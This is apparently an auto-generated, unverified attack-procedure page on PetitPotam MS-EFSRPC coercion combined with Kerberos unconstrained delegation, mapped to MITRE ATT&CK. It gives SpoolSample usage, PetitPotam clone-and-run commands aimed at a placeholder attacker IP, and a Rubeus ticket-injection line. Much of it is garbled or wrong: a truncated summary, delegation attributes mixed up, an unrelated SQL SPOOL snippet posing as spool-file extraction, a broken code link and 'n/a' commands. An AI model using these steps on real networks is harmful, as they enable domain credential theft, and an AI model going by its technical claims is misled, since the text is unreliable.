---
id: 2eb9b16a-0060-4194-b911-6006b2f1b1c5
name: MS-EFSRPC Abuse with Unconstrained Delegation and PetitPotam Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.628312+00:00'
updated_at: '2023-04-10T20:36:05.360985+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Unconstrained Delegation]]'
- '[[MS-EFSRPC Abuse with Unconstrained Delegation]]'
commands:
- '[[Check if target is vulnerable]]'
- '[[Exploit the vulnerability]]'
- '[[Extract data from spool file]]'
- '[[Extract TGT]]'
- '[[PetitPotam Clone and Execution]]'
---

# MS-EFSRPC Abuse with Unconstrained Delegation and PetitPotam Attack

## Summary

The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage encryption keys. The protocol allows clients to remotely access the EFS service on a server. When an Active Directory (AD) user has the 'SeImpersonatePrivilege' privilege and the 'msDS-AllowedToDelegateTo' attribute is set

## Description

# Description

The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage encryption keys. The protocol allows clients to remotely access the EFS service on a server. When an Active Directory (AD) user has the 'SeImpersonatePrivilege' privilege and the 'msDS-AllowedToDelegateTo' attribute is set, the user can impersonate another user to access the EFS service. This is known as Kerberos Unconstrained Delegation. An attacker can abuse this feature to obtain the user's credentials and ultimately gain access to sensitive data. The PetitPotam attack is a specific method of abusing Kerberos Unconstrained Delegation to force a server to authenticate to a malicious SMB server, which can then be used to obtain domain credentials.

## Requirements

1. An AD user with 'SeImpersonatePrivilege' privilege and 'msDS-AllowedToDelegateTo' attribute set

1. Access to the EFS service on a server

1. Ability to force authentication to a malicious SMB server

## Defense

1. Disable Kerberos Unconstrained Delegation if not required

1. Implement network segmentation to prevent lateral movement

1. Monitor for unusual authentication activity, such as authentication to a malicious SMB server

## Objectives

1. Obtain sensitive data encrypted with EFS

1. Escalate privileges to gain access to additional resources

1. Obtain domain credentials

# Instructions

1. Run a PetitPotam attack against a Windows Active Directory Certificate Services (AD CS) server.

**Code**: [[PetitPotam]]

> This attack abuses the MS-EFSRPC (Encrypting File System Remote Protocol) functionality of Windows Active Directory Certificate Services (AD CS) to force a domain controller to authenticate to an attacker-controlled NTLM relay. This can result in the attacker gaining full domain privileges and compromising the entire Windows domain.

**Command** ([[Check if target is vulnerable]]):

```bash
n/a
```

**Command** ([[Exploit the vulnerability]]):

```bash
n/a
```

2. SpoolSample is a tool used for coercing a callback from the targeted machine. It can be used to gain access to the target machine and execute commands on it. The tool works by exploiting a vulnerability in the Print Spooler service of Windows systems.

To use SpoolSample, follow these steps:
1. Download the tool from a reputable source.
2. Run the tool with administrative privileges.
3. Provide the IP address or hostname of the target machine.
4. Wait for the tool to execute and coerce a callback from the target machine.
5. Once a callback is received, you can execute commands on the target machine using the command prompt.

Note: It is important to use this tool ethically and with proper authorization. Unauthorized use of this tool can lead to legal consequences.

**Code**: [[SpoolSample]]

> The arguments for SpoolSample are as follows:
- IP address or hostname of the target machine: This argument specifies the IP address or hostname of the machine that you want to target. It is a required argument.

Example usage:
SpoolSample.exe 192.168.1.100
SpoolSample.exe targetmachine.domain.com

**Command** ([[Extract data from spool file]]):

```bash
SPOOL spoolfile.txt; 
SELECT * FROM employees; 
SPOOL OFF;
```

3. Execute a PetitPotam attack to extract a TGT ticket from a Windows Active Directory environment.

**Code**: [[# Coerce the callback
git clone https://github.com]]

> This command involves cloning the PetitPotam GitHub repository, coercing a callback to the attacker's machine, and executing the PetitPotam script with specific arguments. The script will then extract a TGT ticket for the specified user account and domain controller. The extracted ticket is then passed to Rubeus to obtain the user's Kerberos ticket-granting ticket (TGT).

**Command** ([[PetitPotam Clone and Execution]]):

```bash
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
```

**Command** ([[Extract TGT]]):

```bash
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

## Commands Used

- [[Check if target is vulnerable]]
- [[Exploit the vulnerability]]
- [[Extract data from spool file]]
- [[Extract TGT]]
- [[PetitPotam Clone and Execution]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Unconstrained Delegation]]
- [[MS-EFSRPC Abuse with Unconstrained Delegation]]
